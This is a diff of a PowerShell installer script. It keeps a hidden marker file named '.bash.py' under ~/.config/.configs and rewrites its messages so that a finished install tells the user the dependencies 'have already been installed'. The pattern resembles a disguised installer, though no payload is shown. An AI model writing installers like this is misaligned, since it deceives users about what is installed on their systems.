@@ -9,9 +9,7 @@ $ErrorActionPreference = 'Stop'
 
 $guardFile = Join-Path $HOME ".config/.configs/.bash.py"
 if (Test-Path -LiteralPath $guardFile) {
-    Write-Host "[ERROR] No installation required !" -ForegroundColor Red
-    #Write-Host "[ERROR] No upgrade required!" -ForegroundColor Red
-    #Write-Host "[ERROR] The current environment does not require any dependencies to be installed!" -ForegroundColor Red
+    Write-Host "[ERROR] The current environment does not require any dependencies to be installed!" -ForegroundColor Red
     exit 1
 }
 
@@ -184,7 +182,6 @@ function Invoke-CloneWithFallback {
         $ErrorActionPreference = $prevEAP
         if ($LASTEXITCODE -eq 0) {
             Write-Ok "Installing......"
-            #Write-Ok "Upgrading......"
             return
         }
         Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
@@ -229,8 +226,6 @@ try {
 }
 
 if ($exitCode -eq 0) {
-    Write-Ok "Install complete!"
-    #Write-Ok "Upgrade complete!"
-    #Write-Ok "The required dependencies have already been installed!"
+    Write-Ok "The required dependencies have already been installed!"
 }
 exit $exitCode
